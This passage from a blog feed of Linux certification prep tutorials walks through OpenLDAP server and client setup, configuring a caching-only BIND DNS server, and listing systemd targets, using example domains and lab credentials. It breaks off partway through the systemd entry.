</span><span class='line'>adding new entry "cn=nis,cn=schema,cn=config"</span></code></pre></td></tr></table></div></figure>


<p>Create the <code>/etc/openldap/changes.ldif</code> file with the below content and remember the password value from earlier:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dn: olcDatabase={2}hdb,cn=config
</span><span class='line'>changetype: modify
</span><span class='line'>replace: olcSuffix
</span><span class='line'>olcSuffix: dc=example,dc=com
</span><span class='line'>
</span><span class='line'>dn: olcDatabase={2}hdb,cn=config
</span><span class='line'>changetype: modify
</span><span class='line'>replace: olcRootDN
</span><span class='line'>olcRootDN: cn=Manager,dc=example,dc=com
</span><span class='line'>
</span><span class='line'>dn: olcDatabase={2}hdb,cn=config
</span><span class='line'>changetype: modify
</span><span class='line'>replace: olcRootPW
</span><span class='line'>olcRootPW: {SSHA}T4srVIBK+rJ9DXlVG7dvZnnAQhAZuO07
</span><span class='line'>
</span><span class='line'>dn: cn=config
</span><span class='line'>changetype: modify
</span><span class='line'>replace: olcTLSCertificateFile
</span><span class='line'>olcTLSCertificateFile: /etc/openldap/certs/cert.pem
</span><span class='line'>
</span><span class='line'>dn: cn=config
</span><span class='line'>changetype: modify
</span><span class='line'>replace: olcTLSCertificateKeyFile
</span><span class='line'>olcTLSCertificateKeyFile: /etc/openldap/certs/key.pem
</span><span class='line'>
</span><span class='line'>dn: cn=config
</span><span class='line'>changetype: modify
</span><span class='line'>replace: olcLogLevel
</span><span class='line'>olcLogLevel: -1
</span><span class='line'>
</span><span class='line'>dn: olcDatabase={1}monitor,cn=config
</span><span class='line'>changetype: modify
</span><span class='line'>replace: olcAccess
</span><span class='line'>olcAccess: {0}to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth" read by dn.base="cn=Manager,dc=example,dc=com" read by * none</span></code></pre></td></tr></table></div></figure>


<p>In summary, here you have to be mindful of the certificate and key paths, and of your previously generated password.</p>

<p>Now create the configuration:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapmodify -Y EXTERNAL -H ldapi:/// -f /etc/openldap/changes.ldif
</span><span class='line'>SASL/EXTERNAL authentication started
</span><span class='line'>SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
</span><span class='line'>SASL SSF: 0
</span><span class='line'>modifying entry "olcDatabase={2}hdb,cn=config"
</span><span class='line'>
</span><span class='line'>modifying entry "olcDatabase={2}hdb,cn=config"
</span><span class='line'>
</span><span class='line'>modifying entry "olcDatabase={2}hdb,cn=config"
</span><span class='line'>
</span><span class='line'>modifying entry "cn=config"
</span><span class='line'>
</span><span class='line'>modifying entry "cn=config"
</span><span class='line'>
</span><span class='line'>modifying entry "cn=config"
</span><span class='line'>
</span><span class='line'>modifying entry "olcDatabase={1}monitor,cn=config"</span></code></pre></td></tr></table></div></figure>


<p>Create the file <code>/etc/openldap/base.ldif</code> with the following content:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dn: dc=example,dc=com
</span><span class='line'>dc: example
</span><span class='line'>objectClass: top
</span><span class='line'>objectClass: domain
</span><span class='line'>
</span><span class='line'>dn: ou=People,dc=example,dc=com
</span><span class='line'>ou: People
</span><span class='line'>objectClass: top
</span><span class='line'>objectClass: organizationalUnit
</span><span class='line'>
</span><span class='line'>dn: ou=Group,dc=example,dc=com
</span><span class='line'>ou: Group
</span><span class='line'>objectClass: top
</span><span class='line'>objectClass: organizationalUnit</span></code></pre></td></tr></table></div></figure>


<p>Create the directory structure:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapadd -x -w secret -D cn=Manager,dc=example,dc=com -f /etc/openldap/base.ldif
</span><span class='line'>adding new entry "dc=example,dc=com"
</span><span class='line'>
</span><span class='line'>adding new entry "ou=People,dc=example,dc=com"
</span><span class='line'>
</span><span class='line'>adding new entry "ou=Group,dc=example,dc=com"</span></code></pre></td></tr></table></div></figure>


<p>This command uses simple authentication and reads the previously created file.</p>

<p>Now it&rsquo;s time to create a sample user account and see if things are working:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /home/ldap
</span><span class='line'>useradd -d /home/ldap/sam sam
</span><span class='line'>passwd sam </span></code></pre></td></tr></table></div></figure>


<p>Some additional steps are needed for user account migration:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd /usr/share/migrationtools </span></code></pre></td></tr></table></div></figure>


<p>Edit <strong>migrate_common.ph</strong> to have your domain values:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Default DNS domain
</span><span class='line'>$DEFAULT_MAIL_DOMAIN = "example.com";
</span><span class='line'>
</span><span class='line'># Default base 
</span><span class='line'>$DEFAULT_BASE = "dc=example,dc=com";</span></code></pre></td></tr></table></div></figure>


<p>Add the user to the directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/passwd | grep sam &gt; passwd
</span><span class='line'>cat passwd 
</span><span class='line'>sam:x:1004:1004::/home/ldap/sam:/bin/bash
</span><span class='line'>ldapadd -x -w secret -D cn=Manager,dc=example,dc=com -f users.ldif
</span><span class='line'>./migrate_passwd.pl passwd users.ldif</span></code></pre></td></tr></table></div></figure>


<p>Check out the <em>users.ldif</em> file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat users.ldif 
</span><span class='line'>dn: uid=sam,ou=People,dc=example,dc=com
</span><span class='line'>uid: sam
</span><span class='line'>cn: sam
</span><span class='line'>objectClass: account
</span><span class='line'>objectClass: posixAccount
</span><span class='line'>objectClass: top
</span><span class='line'>objectClass: shadowAccount
</span><span class='line'>userPassword: {crypt}$6$L49gzmY1$n0RNoX86rhT4QMvmsKWkMruHT/BCh7yBm2cQOdb4pbOA7XM0RB4d4GsoDpSILQSjYduiPponzFDb8O7bIb1kA.
</span><span class='line'>shadowLastChange: 17573
</span><span class='line'>shadowMin: 0
</span><span class='line'>shadowMax: 99999
</span><span class='line'>shadowWarning: 7
</span><span class='line'>loginShell: /bin/bash
</span><span class='line'>uidNumber: 1004
</span><span class='line'>gidNumber: 1004
</span><span class='line'>homeDirectory: /home/ldap/sam</span></code></pre></td></tr></table></div></figure>


<p>Add the user entry:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapadd -x -w secret -D cn=Manager,dc=example,dc=com -f users.ldif
</span><span class='line'>adding new entry "uid=sam,ou=People,dc=example,dc=com"</span></code></pre></td></tr></table></div></figure>


<p>Do the same for group:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/group | grep sam &gt; group
</span><span class='line'>cat group
</span><span class='line'>sam:x:1004:</span></code></pre></td></tr></table></div></figure>


<p>Migrate the group:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./migrate_group.pl group groups.ldif</span></code></pre></td></tr></table></div></figure>


<p>Check the groups.ldif file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat groups.ldif 
</span><span class='line'>dn: cn=sam,ou=Group,dc=example,dc=com
</span><span class='line'>objectClass: posixGroup
</span><span class='line'>objectClass: top
</span><span class='line'>cn: sam
</span><span class='line'>userPassword: {crypt}x
</span><span class='line'>gidNumber: 1004</span></code></pre></td></tr></table></div></figure>


<p>Add the group:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapadd -x -w secret -D cn=Manager,dc=example,dc=com -f groups.ldif
</span><span class='line'>adding new entry "cn=sam,ou=Group,dc=example,dc=com"</span></code></pre></td></tr></table></div></figure>


<p>Now search for the user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapsearch -x cn=sam -b dc=example,dc=com
</span><span class='line'># extended LDIF
</span><span class='line'>#
</span><span class='line'># LDAPv3
</span><span class='line'># base &lt;dc=example,dc=com&gt; with scope subtree
</span><span class='line'># filter: cn=sam
</span><span class='line'># requesting: ALL
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'># sam, People, example.com
</span><span class='line'>dn: uid=sam,ou=People,dc=example,dc=com
</span><span class='line'>uid: sam
</span><span class='line'>cn: sam
</span><span class='line'>objectClass: account
</span><span class='line'>objectClass: posixAccount
</span><span class='line'>objectClass: top
</span><span class='line'>objectClass: shadowAccount
</span><span class='line'>userPassword:: e2NyeXB0fSQ2JEw0OWd6bVkxJG4wUk5vWDg2cmhUNFFNdm1zS1drTXJ1SFQvQkN
</span><span class='line'> oN3lCbTJjUU9kYjRwYk9BN1hNMFJCNGQ0R3NvRHBTSUxRU2pZZHVpUHBvbnpGRGI4TzdiSWIxa0Eu
</span><span class='line'>shadowLastChange: 17573
</span><span class='line'>shadowMin: 0
</span><span class='line'>shadowMax: 99999
</span><span class='line'>shadowWarning: 7
</span><span class='line'>loginShell: /bin/bash
</span><span class='line'>uidNumber: 1004
</span><span class='line'>gidNumber: 1004
</span><span class='line'>homeDirectory: /home/ldap/sam
</span><span class='line'>
</span><span class='line'># sam, Group, example.com
</span><span class='line'>dn: cn=sam,ou=Group,dc=example,dc=com
</span><span class='line'>objectClass: posixGroup
</span><span class='line'>objectClass: top
</span><span class='line'>cn: sam
</span><span class='line'>userPassword:: e2NyeXB0fXg=
</span><span class='line'>gidNumber: 1004
</span><span class='line'>
</span><span class='line'># search result
</span><span class='line'>search: 2
</span><span class='line'>result: 0 Success
</span><span class='line'>
</span><span class='line'># numResponses: 3
</span><span class='line'># numEntries: 2</span></code></pre></td></tr></table></div></figure>


<p>You might also need to allow ldap in the firewall.</p>

<h2>Client configuration</h2>

<p>If you hoped it was over, we still have to verify the authentication from a client machine. On my client, I also added the server in /etc/hosts:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.217.131 centos.example.com</span></code></pre></td></tr></table></div></figure>


<p>The interface used for configuring authentication is <code>authconfig</code>. For this example I will go over the <strong>nslcd</strong> route.</p>

<p>On the client, install the needed packages:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum install -y openldap-clients nss-pam-ldapd</span></code></pre></td></tr></table></div></figure>


<p>Run the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>authconfig --enableforcelegacy --update
</span><span class='line'>authconfig --enableldap --enableldapauth --ldapserver="centos.example.com" --ldapbasedn="dc=example,dc=com" --update</span></code></pre></td></tr></table></div></figure>


<p>Download the certificate:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>scp root@centos.example.com:/etc/openldap/certs/cert.pem /etc/openldap/cacerts/cert.pem
</span><span class='line'>root@centos.example.com's password: 
</span><span class='line'>cert.pem                                      100% 1298   107.3KB/s   00:00    </span></code></pre></td></tr></table></div></figure>


<p>Enable TLS:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>authconfig --enableldaptls --update</span></code></pre></td></tr></table></div></figure>


<p>You can do a getent or try to login as the LDAP user to see if it works.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Your temporary financial embarrassment \
</span><span class='line'>| will be relieved in a surprising       |
</span><span class='line'>\ manner.                                /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Configure caching-only DNS]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/10/lfcs-prep-configure-caching-only-dns/"/>
    <updated>2018-02-10T14:04:48-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/10/lfcs-prep-configure-caching-only-dns</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll take a look at setting up a caching only DNS server for the LFCS exam objectives.</p>

<!-- more -->


<p>First, install the necessary DNS packages: <code>yum install -y bind bind-utils</code>.</p>

<p>Then you will have to do some editing in <code>/etc/named.conf</code>. In particular, you are interested in the below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>listen-on port 53 { 127.0.0.1; any; };
</span><span class='line'>allow-query     { localhost; any; };
</span><span class='line'>allow-query-cache     { localhost; any; };</span></code></pre></td></tr></table></div></figure>


<p>The <em>allow-query</em> option deals with who can send queries to the server, while the <em>allow-query-cache</em> allows access to cached records</p>

<p>You have to ensure the named.conf file has the proper permissions. It needs to be owned by root and belong to the group named:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l /etc/named.conf
</span><span class='line'>-rw-r-----. 1 root named 1754 Feb 10 19:46 /etc/named.conf</span></code></pre></td></tr></table></div></figure>


<p>Check the SELinux contexts:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -lZ /etc/named.*
</span><span class='line'>-rw-r-----. root named unconfined_u:object_r:etc_t:s0   /etc/named.conf
</span><span class='line'>-rw-r--r--. root named system_u:object_r:etc_t:s0       /etc/named.iscdlv.key
</span><span class='line'>-rw-r-----. root named system_u:object_r:named_conf_t:s0 /etc/named.rfc1912.zones
</span><span class='line'>-rw-r--r--. root named system_u:object_r:etc_t:s0       /etc/named.root.key</span></code></pre></td></tr></table></div></figure>


<p>Check the config file for syntax errors before trying anything:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>named-checkconf /etc/named.conf</span></code></pre></td></tr></table></div></figure>


<p>Start the DNS service:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl start named</span></code></pre></td></tr></table></div></figure>


<p>Open port 53 on the firewall:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --add-port=53/udp</span></code></pre></td></tr></table></div></figure>


<p>On the client, add the DNS server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con mod ens33 ipv4.dns "192.168.217.131"</span></code></pre></td></tr></table></div></figure>


<p>Restart the connection and NetworkManager. Check that the nameserver has been added in <code>/etc/resolv.conf</code>. Now you can test it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nslookup github.com
</span><span class='line'>Server:       192.168.217.131
</span><span class='line'>Address:  192.168.217.131#53
</span><span class='line'>
</span><span class='line'>Non-authoritative answer:
</span><span class='line'>Name: github.com
</span><span class='line'>Address: 192.30.253.113
</span><span class='line'>Name: github.com
</span><span class='line'>Address: 192.30.253.112</span></code></pre></td></tr></table></div></figure>


<p>If you need to add a zone to your DNS server, take a look at the sample zone directives in <em>/etc/named.rfc1912.zones</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>zone "localhost.localdomain" IN {
</span><span class='line'>  type master;
</span><span class='line'>  file "named.localhost";
</span><span class='line'>  allow-update { none; };
</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>


<p>You have to add a similar configuration for your zone inside <code>/etc/named.conf</code>. Then you also have to create a zone file inside <strong>/var/named</strong>. For reference, look at an existing one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /var/named/named.localhost 
</span><span class='line'>$TTL 1D
</span><span class='line'>@ IN SOA  @ rname.invalid. (
</span><span class='line'>                  0   ; serial
</span><span class='line'>                  1D  ; refresh
</span><span class='line'>                  1H  ; retry
</span><span class='line'>                  1W  ; expire
</span><span class='line'>                  3H )    ; minimum
</span><span class='line'>  NS  @
</span><span class='line'>  A   127.0.0.1
</span><span class='line'>  AAAA    ::1</span></code></pre></td></tr></table></div></figure>


<p>This should be all that is needed in terms of DNS configuration for LFCS objectives.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ____________________________________
</span><span class='line'>/ This life is yours. Some of it was \
</span><span class='line'>| given to you; the rest, you made   |
</span><span class='line'>\ yourself.                          /
</span><span class='line'> ------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Runlevels and bootloader configuration]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/08/lfcs-prep-runlevels-and-bootloader-configuration/"/>
    <updated>2018-02-08T12:47:30-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/08/lfcs-prep-runlevels-and-bootloader-configuration</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look at the following LFCS objectives:</p>

<ul>
<li><p>Log into graphical and text mode consoles</p></li>
<li><p>Boot systems into different runlevels manually</p></li>
<li><p>Install, configure and troubleshoot the  bootloader</p></li>
</ul>


<!-- more -->


<h2>systemd targets</h2>

<p>First, let&rsquo;s take a look at all the available targets:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl list-units --type=target --all
</span><span class='line'>  UNIT                   LOAD      ACTIVE   SUB    DESCRIPTION
</span><span class='line'>  basic.target           loaded    active   active Basic System
</span><span class='line'>  cryptsetup.target      loaded    active   active Encrypted Volumes
</span><span class='line'>  emergency.target       loaded    inactive dead   Emergency Mode
</span><span class='line'>  final.target           loaded    inactive dead   Final Step
</span><span class='line'>  getty.target           loaded    active   active Login Prompts
</span><span class='line'>  graphical.target       loaded    active   active Graphical Interface
</span><span class='line'>  local-fs-pre.target    loaded    active   active Local File Systems (Pre)
</span><span class='line'>  local-fs.target        loaded    active   active Local File Systems
</span><span class='line'>  multi-user.target      loaded    active   active Multi-User System
</span><span class='line'>  network-online.target  loaded    active   active Network is Online
</span><span class='line'>  network-pre.target     loaded    inactive dead   Network (Pre)
</span><span class='line'>  network.target         loaded    active   active Network
</span><span class='line'>  nfs-client.target      loaded    active   active NFS client services
</span><span class='line'>  nss-lookup.target      loaded    inactive dead   Host and Network Name Lookups
</span><span class='line'>  nss-user-lookup.target loaded    active   active User and Group Name Lookups
</span><span class='line'>  paths.target           loaded    active   active Paths
</span><span class='line'>  remote-fs-pre.target   loaded    active   active Remote File Systems (Pre)
</span><span class='line'>  remote-fs.target       loaded    active   active Remote File Systems
</span><span class='line'>  rescue.target          loaded    inactive dead   Rescue Mode
</span><span class='line'>  rpcbind.target         loaded    inactive dead   RPC Port Mapper
</span><span class='line'>  shutdown.target        loaded    inactive dead   Shutdown
</span><span class='line'>  slices.target          loaded    active   active Slices
</span><span class='line'>  sockets.target         loaded    active   active Sockets
</span><span class='line'>  swap.target            loaded    active   active Swap
</span><span class='line'>  sysinit.target         loaded    active   active System Initialization
</span><span class='line'>● syslog.target          not-found inactive dead   syslog.target
</span><span class='line'>  time-sync.target       loaded    inactive dead   System Time Synchronized
</span><span class='line'>  timers.target          loaded    active   active Timers
</span><span class='line'>  umount.target          loaded    inactive dead   Unmount All Filesystems
</span><span class='line'>
</span><span class='line'>LOAD   = Reflects whether the unit definition was properly loaded.
</span><span class='line'>ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
</span><span class='line'>SUB    = The low-level unit activation state, values depend on unit type.
</span><span class='line'>
</span><span class='line'>29 loaded units listed.
</span><span class='line'>To show all installed unit files use 'systemctl list-unit-files'.</span></code></pre></td></tr></table></div></figure>


<p>Out of these, we will only look at the most relevant ones:</p>

<ul>
<li><p><strong>emergency.target</strong> = emergency mode. All you have is systemd and a shell. This is what you use if, for instance, you experience disk failure</p></li>
<li><p><strong>rescue.target</strong> = single user mode. It&rsquo;s the equivalent of runlevel 1. In this mode, the early boot services are started and local mount points are mounted. No networking</p></li>
<li><p><strong>multi-user.target</strong> = multi-user text mode with networking. Equivalent to runlevel 3</p></li>
<li><p><strong>graphical.target</strong> = multi-user with GUI. Equivalent to runlevel 5</p></li>
</ul>


<p>Let&rsquo;s see what the default target is on my system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl get-default
</span><span class='line'>graphical.target</span></code></pre></td></tr></table></div></figure>


<p>You can set a new default target with <code>systemctl set-default</code></p>

